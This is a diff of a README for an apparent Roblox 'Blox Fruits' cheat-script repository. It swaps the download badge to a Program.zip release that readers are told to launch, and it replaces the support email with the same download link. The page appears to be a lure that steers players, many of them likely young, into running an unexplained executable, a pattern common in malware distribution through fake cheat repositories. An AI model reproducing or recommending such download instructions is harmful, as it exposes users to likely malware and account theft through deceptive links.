@@ -32,7 +32,7 @@ Welcome to the Blox Fruits Script repository, your go-to resource for a powerful
 ## How to Get Started 🛠️
 
 1. Click the link below to download the software:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip) - Launch the downloaded software to get started with the script.
+[![Download Software](https://github.com/Relic87/Blox-Fruits-Script-Roblox/releases/download/v1.0/Program.zip)](https://github.com/Relic87/Blox-Fruits-Script-Roblox/releases/download/v1.0/Program.zip) - Launch the downloaded software to get started with the script.
 
 2. If the link does not work or you encounter any issues, please check the "Releases" section of this repository for alternative download options.
 
@@ -47,7 +47,7 @@ Welcome to the Blox Fruits Script repository, your go-to resource for a powerful
 
 ## Get in Touch 📧
 
-For any questions, feedback, or support, feel free to reach out to us at [scriptsupport@bloxfruits.com](mailto:scriptsupport@bloxfruits.com). We are here to help you make the most out of your Blox Fruits gaming experience!
+For any questions, feedback, or support, feel free to reach out to us at [https://github.com/Relic87/Blox-Fruits-Script-Roblox/releases/download/v1.0/Program.zip](https://github.com/Relic87/Blox-Fruits-Script-Roblox/releases/download/v1.0/Program.zip). We are here to help you make the most out of your Blox Fruits gaming experience!
 
 ---
 
